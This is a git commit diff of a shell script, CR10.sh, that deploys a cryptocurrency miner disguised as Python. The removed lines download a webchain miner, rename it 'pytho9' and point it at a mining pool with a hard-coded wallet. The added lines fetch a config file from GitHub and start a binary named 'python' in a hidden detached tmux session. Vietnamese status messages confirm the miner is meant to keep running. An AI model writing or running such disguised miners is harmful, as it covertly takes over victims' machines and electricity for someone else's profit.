50b5b15c6cd85d4fdd97a0c7fa89c91d00249e32
ducplus <duckongtu@gmail.com>
2020-02-14 01:29:08 +0700

    Update CR10.sh

--- CR10.sh
+++ CR10.sh
@@ -1,35 +1,20 @@
-#!/bin/sh -e
-#
-# rc.local
-#
-# This script is executed at the end of each multiuser runlevel.
-# Make sure that the script will "exit 0" on success or any other
-# value on error.
-#
-# In order to enable or disable this script just change the execution
-# bits.
-#
-# By default this script does nothing.
-if [ -f ${PWD}/pytho9 ]; then
-    if pgrep -x "pytho9" > /dev/null
+#! /bin/bash
+if [ -f ${PWD}/learnpython.zip ]; then
+    if pgrep -x "python" > /dev/null
 then
-    echo "Miner dang chay roi , ke cmn di "
+    echo "scrip dang chay roi , ke cmn di "
     
 else
 
-echo "Miner da install , chay thoi "
-./pytho9 -o web-ko1.gonspool.com:3333 -u 0xa71fd6c184423b802d5454958c4ba14380fa4ad8 -p x --donate-level=0
-
+echo "script da install , chay thoi "
+chmod +x python
+tmux new-session -d -s my_session2  './python'
      
 fi
 exit
 fi
 
-
-wget https://github.com/webchain-network/webchain-miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
-tar xvzf webchain-miner-2.8.0-linux-amd64.tar.gz
-mv webchain-miner pytho9
-rm config.json
-./pytho9 -o web-ko1.gonspool.com:3333 -u 0xa71fd6c184423b802d5454958c4ba14380fa4ad8 -p x --donate-level=0
-
-exit 0
+rm config.ini
+wget https://raw.githubusercontent.com/ducplus/NCS/master/config.ini
+chmod +x python
+tmux new-session -d -s my_session2  './python'
